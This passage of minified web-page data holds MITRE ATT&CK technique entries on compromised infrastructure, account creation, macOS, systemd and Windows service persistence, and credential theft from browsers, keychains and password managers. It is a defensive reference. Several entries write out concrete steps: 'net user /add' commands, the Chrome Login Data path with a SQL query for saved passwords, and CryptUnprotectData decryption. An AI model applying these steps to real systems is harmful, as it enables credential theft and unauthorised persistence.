DNS entries and avoid subdomain takeover. Retrieved October 12, 2020."}];nc["subtechnique-of"]=Z;ne.id=nf;ne["object-type"]=a;ne.name=jm;ne.description="Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F004'\u003EServer\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583\u002F003'\u003EVirtual Private Server\u003C\u002Fa\u003E, adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E.";ne.external_references=[{source_name:b,external_id:nf,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584\u002F004"}];ne["subtechnique-of"]=Z;ng.id=nh;ng["object-type"]=a;ng.name=js;ng.description="Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines\u002Fcontainers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedia.defense.gov\u002F2019\u002FOct\u002F18\u002F2002197242\u002F-1\u002F-1\u002F0\u002FNSA_CSA_Turla_20191021%20ver%204%20-%20nsa.gov.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.";ng.external_references=[{source_name:b,external_id:nh,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584\u002F003"},{source_name:mX,url:mY,description:mZ}];ng["subtechnique-of"]=Z;ni.id=nj;ni["object-type"]=a;ni.name=jv;ni.description="Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1102'\u003EWeb Service\u003C\u002Fa\u003E) or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1567'\u003EExfiltration Over Web Service\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.recordedfuture.com\u002Fturla-apt-infrastructure\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them.";ni.external_references=[{source_name:b,external_id:nj,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584\u002F006"},{source_name:"Recorded Future Turla Infra 2020",url:"https:\u002F\u002Fwww.recordedfuture.com\u002Fturla-apt-infrastructure\u002F",description:"Insikt Group. (2020, March 12). Swallowing the Snake’s Tail: Tracking Turla Infrastructure. Retrieved October 20, 2020."}];ni["subtechnique-of"]=Z;np.id=nq;np["object-type"]=a;np.name=im;np.description="Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Foffice365\u002Fadmin\u002Fadd-users\u002Fabout-admin-roles?view=o365-worldwide'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.office.com\u002Fen-us\u002Farticle\u002Fadd-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.aws.amazon.com\u002FIAM\u002Flatest\u002FUserGuide\u002Fid_users_create.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.google.com\u002Fcloudidentity\u002Fanswer\u002F7332836?hl=en&ref_topic=7558554'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Ffundamentals\u002Fadd-users-azure-active-directory'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.";np.external_references=[{source_name:b,external_id:nq,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1136\u002F003"},{source_name:iK,url:iL,description:iM},{source_name:iH,url:iI,description:iJ},{source_name:"AWS Create IAM User",url:"https:\u002F\u002Fdocs.aws.amazon.com\u002FIAM\u002Flatest\u002FUserGuide\u002Fid_users_create.html",description:"AWS. (n.d.). Creating an IAM User in Your AWS Account. Retrieved January 29, 2020."},{source_name:"GCP Create Cloud Identity Users",url:"https:\u002F\u002Fsupport.google.com\u002Fcloudidentity\u002Fanswer\u002F7332836?hl=en&ref_topic=7558554",description:"Google. (n.d.). Create Cloud Identity user accounts. Retrieved January 29, 2020."},{source_name:"Microsoft Azure AD Users",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Factive-directory\u002Ffundamentals\u002Fadd-users-azure-active-directory",description:"Microsoft. (2019, November 11). Add or delete users using Azure Active Directory. Retrieved January 30, 2020."}];np["subtechnique-of"]=br;nr.id=ns;nr["object-type"]=a;nr.name=iv;nr.description="Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the \u003Ccode\u003Enet user \u002Fadd \u002Fdomain\u003C\u002Fcode\u003E command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.";nr.external_references=[{source_name:b,external_id:ns,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1136\u002F002"},{source_name:eC,description:eD,url:eE}];nr["subtechnique-of"]=br;nt.id=nu;nt["object-type"]=a;nt.name=iB;nt.description="Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the \u003Ccode\u003Enet user \u002Fadd\u003C\u002Fcode\u003E command can be used to create a local account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.";nt.external_references=[{source_name:b,external_id:nu,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1136\u002F001"},{source_name:eC,description:eD,url:eE}];nt["subtechnique-of"]=br;ny.id=nz;ny["object-type"]=a;ny.name="Launch Agent";ny.description="Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in \u003Ccode\u003E\u002FSystem\u002FLibrary\u002FLaunchAgents\u003C\u002Fcode\u003E, \u003Ccode\u003E\u002FLibrary\u002FLaunchAgents\u003C\u002Fcode\u003E, and \u003Ccode\u003E$HOME\u002FLibrary\u002FLaunchAgents\u003C\u002Fcode\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FCreatingLaunchdJobs.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2016\u002F07\u002F06\u002Fnew-osxkeydnap-malware-hungry-credentials\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fthreat-analysis\u002F2017\u002F01\u002Fnew-mac-backdoor-using-antiquated-code\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. These launch agents have property list files which point to the executables that will be launched \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fthreat-analysis\u002F2017\u002F04\u002Fnew-osx-dok-malware-intercepts-web-traffic\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E.\n \nAdversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  \u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2016\u002F09\u002Funit42-sofacys-komplex-os-x-trojan\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E  \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.synack.com\u002Fwp-content\u002Fuploads\u002F2016\u002F03\u002FRSA_OSX_Malware.pdf'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.alienvault.com\u002Fblogs\u002Flabs-research\u002Foceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).";ny.external_references=[{source_name:b,external_id:nz,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F001"},{url:cq,description:cr,source_name:cs},{url:b_,description:b$,source_name:ca},{url:ct,description:cu,source_name:cv},{url:dK,description:dL,source_name:dM},{url:bl,description:bm,source_name:bn},{url:B,description:S,source_name:T},{url:eF,description:eG,source_name:eH},{url:nA,description:nB,source_name:nC}];ny["subtechnique-of"]=aO;nD.id=nE;nD["object-type"]=a;nD.name="Launch Daemon";nD.description="Adversaries may create or modify launch daemons to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in \u003Ccode\u003E\u002FSystem\u002FLibrary\u002FLaunchDaemons\u003C\u002Fcode\u003E and \u003Ccode\u003E\u002FLibrary\u002FLaunchDaemons\u003C\u002Fcode\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FCreatingLaunchdJobs.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. These LaunchDaemons have property list files which point to the executables that will be launched \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. \n\nAdversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories  \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.synack.com\u002Fwp-content\u002Fuploads\u002F2016\u002F03\u002FRSA_OSX_Malware.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. The daemon name may be disguised by using a name from a related operating system or benign software \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.paloaltonetworks.com\u002Fcontent\u002Fdam\u002Fpan\u002Fen_US\u002Fassets\u002Fpdf\u002Freports\u002FUnit_42\u002Funit42-wirelurker.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. \n\nThe plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation. ";nD.external_references=[{source_name:b,external_id:nE,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F004"},{external_id:eI,source_name:c,url:eJ},{external_id:eK,source_name:c,url:eL},{url:cq,description:cr,source_name:cs},{url:B,description:S,source_name:T},{url:eF,description:eG,source_name:eH},{url:nF,description:nG,source_name:nH}];nD["subtechnique-of"]=aO;nI.id=nJ;nI["object-type"]=a;nI.name="Systemd Service";nI.description="Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002Fman1\u002Fsystemd.1.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.freedesktop.org\u002Fwiki\u002FSoftware\u002Fsystemd\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.\n\nSystemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the \u003Ccode\u003E\u002Fetc\u002Fsystemd\u002Fsystem\u003C\u002Fcode\u003E and \u003Ccode\u003E\u002Fusr\u002Flib\u002Fsystemd\u002Fsystem\u003C\u002Fcode\u003E directories and have the file extension \u003Ccode\u003E.service\u003C\u002Fcode\u003E. Each service unit file may contain numerous directives that can execute system commands:\n\n* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. \n* ExecReload directive covers when a service restarts. \n* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.\n\nAdversaries have used systemd functionality to establish persistent access to victim systems by creating and\u002For modifying service unit files that cause systemd to execute malicious commands at system boot.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.anomali.com\u002Fblog\u002Frocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nWhile adversaries typically require root privileges to create\u002Fmodify service unit files in the \u003Ccode\u003E\u002Fetc\u002Fsystemd\u002Fsystem\u003C\u002Fcode\u003E and \u003Ccode\u003E\u002Fusr\u002Flib\u002Fsystemd\u002Fsystem\u003C\u002Fcode\u003E directories, low privilege users can create\u002Fmodify service unit files in directories such as \u003Ccode\u003E~\u002F.config\u002Fsystemd\u002Fuser\u002F\u003C\u002Fcode\u003E to achieve user-level persistence.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.rapid7.com\u002Fdb\u002Fmodules\u002Fexploit\u002Flinux\u002Flocal\u002Fservice_persistence'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";nI.external_references=[{source_name:b,external_id:nJ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F002"},{external_id:eI,source_name:c,url:eJ},{external_id:eK,source_name:c,url:eL},{source_name:nK,url:nL,description:nM},{source_name:"Freedesktop.org Linux systemd 29SEP2018",url:"https:\u002F\u002Fwww.freedesktop.org\u002Fwiki\u002FSoftware\u002Fsystemd\u002F",description:"Freedesktop.org. (2018, September 29). systemd System and Service Manager. Retrieved April 23, 2019."},{source_name:"Anomali Rocke March 2019",url:"https:\u002F\u002Fwww.anomali.com\u002Fblog\u002Frocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang",description:"Anomali Labs. (2019, March 15). Rocke Evolves Its Arsenal With a New Malware Family Written in Golang. Retrieved April 24, 2019."},{source_name:"Rapid7 Service Persistence 22JUNE2016",url:"https:\u002F\u002Fwww.rapid7.com\u002Fdb\u002Fmodules\u002Fexploit\u002Flinux\u002Flocal\u002Fservice_persistence",description:"Rapid7. (2016, June 22). Service Persistence. Retrieved April 23, 2019."}];nI["subtechnique-of"]=aO;nN.id=nO;nN["object-type"]=a;nN.name="Windows Service";nN.description="Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fcc772408.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Windows service configuration information, including the file path to the service's executable or recovery programs\u002Fcommands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0075'\u003EReg\u003C\u002Fa\u003E. \n\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\n\nAn adversary may also incorporate \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1036'\u003EMasquerading\u003C\u002Fa\u003E by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1569\u002F002'\u003EService Execution\u003C\u002Fa\u003E. ";nN.external_references=[{source_name:b,external_id:nO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F003"},{external_id:nP,source_name:c,url:nQ},{external_id:eI,source_name:c,url:eJ},{external_id:eK,source_name:c,url:eL},{url:nv,description:nw,source_name:nx},{url:y,description:z,source_name:A},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fsecurity\u002Fthreat-protection\u002Fauditing\u002Fevent-4697",description:"Miroshnikov, A. & Hall, J. (2017, April 18). 4697(S): A service was installed in the system. Retrieved August 7, 2018.",source_name:"Microsoft 4697 APR 2017"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fwindows\u002Fsecurity\u002Fthreat-protection\u002Fuse-windows-event-forwarding-to-assist-in-intrusion-detection",description:"Hardy, T. & Hall, J. (2018, February 15). Use Windows Event Forwarding to help with intrusion detection. Retrieved August 7, 2018.",source_name:"Microsoft Windows Event Forwarding FEB 2018"}];nN["subtechnique-of"]=aO;nR.id=nS;nR["object-type"]=a;nR.name="Credentials from Web Browsers";nR.description="Adversaries may acquire credentials from web browsers by reading files specific to the target browser.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2018\u002F02\u002Folympic-destroyer.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, \u003Ccode\u003EAppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\u003C\u002Fcode\u003E and executing a SQL query: \u003Ccode\u003ESELECT action_url, username_value, password_value FROM logins;\u003C\u002Fcode\u003E. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function \u003Ccode\u003ECryptUnprotectData\u003C\u002Fcode\u003E, which uses the victim’s cached logon credentials as the decryption key. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fdesktop\u002Fapi\u002Fdpapi\u002Fnf-dpapi-cryptunprotectdata'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.proofpoint.com\u002Fus\u002Fthreat-insight\u002Fpost\u002Fnew-vega-stealer-shines-brightly-targeted-campaign'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F07\u002Fhawkeye-malware-distributed-in-phishing-campaign.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1555\u002F004'\u003EWindows Credential Manager\u003C\u002Fa\u003E.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fputterpanda\u002Fmimikittenz'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and\u002For accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).";nR.external_references=[{source_name:b,external_id:nS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1555\u002F003"},{source_name:bs,url:bt,description:bu},{source_name:"Microsoft CryptUnprotectData April 2018",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fdesktop\u002Fapi\u002Fdpapi\u002Fnf-dpapi-cryptunprotectdata",description:"Microsoft. (2018, April 12). CryptUnprotectData function. Retrieved June 18, 2019."},{source_name:"Proofpoint Vega Credential Stealer May 2018",url:"https:\u002F\u002Fwww.proofpoint.com\u002Fus\u002Fthreat-insight\u002Fpost\u002Fnew-vega-stealer-shines-brightly-targeted-campaign",description:"Proofpoint. (2018, May 10). New Vega Stealer shines brightly in targeted campaign . Retrieved June 18, 2019."},{source_name:"FireEye HawkEye Malware July 2017",url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F07\u002Fhawkeye-malware-distributed-in-phishing-campaign.html",description:"Swapnil Patil, Yogesh Londhe. (2017, July 25). HawkEye Credential Theft Malware Distributed in Recent Phishing Campaign. Retrieved June 18, 2019."},{source_name:"GitHub Mimikittenz July 2016",url:"https:\u002F\u002Fgithub.com\u002Fputterpanda\u002Fmimikittenz",description:"Jamieson O'Reilly (putterpanda). (2016, July 4). mimikittenz. Retrieved June 20, 2019."}];nR["subtechnique-of"]=as;nT.id=nU;nT["object-type"]=a;nT.name="Keychain";nT.description="Adversaries may collect the keychain storage data from a system to acquire credentials. Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in \u003Ccode\u003E~\u002FLibrary\u002FKeychains\u002F\u003C\u002Fcode\u003E,\u003Ccode\u003E\u002FLibrary\u002FKeychains\u002F\u003C\u002Fcode\u003E, and \u003Ccode\u003E\u002FNetwork\u002FLibrary\u002FKeychains\u002F\u003C\u002Fcode\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FKeychain_(software)'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The \u003Ccode\u003Esecurity\u003C\u002Fcode\u003E command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.\n\nTo manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.slideshare.net\u002FStephanBorosh\u002Fexternal-to-da-the-os-x-way'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E By default, the passphrase for the keychain is the user’s logon credentials.";nT.external_references=[{source_name:b,external_id:nU,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1555\u002F001"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FKeychain_(software)",description:"Wikipedia. (n.d.). Keychain (software). Retrieved July 5, 2017.",source_name:"Wikipedia keychain"},{url:eM,description:eN,source_name:eO}];nT["subtechnique-of"]=as;nV.id=nW;nV["object-type"]=a;nV.name="Password Managers";nV.description="Adversaries may acquire user credentials from third-party password managers.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.ise.io\u002Fcasestudies\u002Fpassword-manager-hacking\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.ise.io\u002Fcasestudies\u002Fpassword-manager-hacking\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may acquire user credentials from password managers by extracting the master password and\u002For plain-text credentials from memory.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresources.fox-it.com\u002Frs\u002F170-CAK-271\u002Fimages\u002F201912_Report_Operation_Wocao.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FGhostPack\u002FKeeThief'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may extract credentials from memory via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1212'\u003EExploitation for Credential Access\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2019-3610'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n Adversaries may also try brute forcing via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110\u002F001'\u003EPassword Guessing\u003C\u002Fa\u003E to obtain the master password of a password manager.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cybereason.com\u002Fblog\u002Fdropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";nV.external_references=[{source_name:b,external_id:nW,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1555\u002F005"},{source_name:"ise Password Manager February 2019",url:"https:\u002F\u002Fwww.ise.io\u002Fcasestudies\u002Fpassword-manager-hacking\u002F",description:"ise. (2019, February 19). Password Managers: Under the Hood of Secrets Management. Retrieved January 22, 2021."},{source_name:"FoxIT Wocao December 2019",url:"https:\u002F\u002Fresources.fox-it.com\u002Frs\u002F170-CAK-271\u002Fimages\u002F201912_Report_Operation_Wocao.pdf",description:"Dantzig, M. v., Schamper, E. (2019, December 19). Operation Wocao: Shining a light on one of China’s hidden hacking groups. Retrieved October 8, 2020."},{source_name:"Github KeeThief",url:"https:\u002F\u002Fgithub.com\u002FGhostPack\u002FKeeThief",description:"Lee, C., Schoreder, W. (n.d.). KeeThief. Retrieved February 8, 2021."},{source_name:"NVD CVE-2019-3610",url:"https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2019-3610",description:"National Vulnerability Database. (2019, October 9). CVE-2019-3610 Detail. Retrieved April 14, 2021."},{source_name:"Cyberreason Anchor December 2019",url:"https:\u002F\u002Fwww.cybereason.com\u002Fblog\u002Fdropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware",description:"Dahan, A. et al. (2019, December 11). DROPPING ANCHOR: FROM A TRICKBOT INFECTION TO THE DISCOVERY OF THE ANCHOR MALWARE. Retrieved September 10, 2020."}];nV["subtechnique-of"]=as;nX.id=nY;nX["object-type"]=a;nX.name="Securityd Memory";nX.description="An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fjuusosalonen.com\u002Fpost\u002F30923743427\u002Fbreaking-into-the-os-x-keychain'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2016\u002F07\u002F06\u002Fnew-osxkeydnap-malware-hungry-credentials\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fjuusosalonen.com\u002Fpost\u002F30923743427\u002Fbreaking-into-the-os-x-keychain'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.slideshare.net\u002FStephanBorosh\u002Fexternal-to-da-the-os-x-way'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. 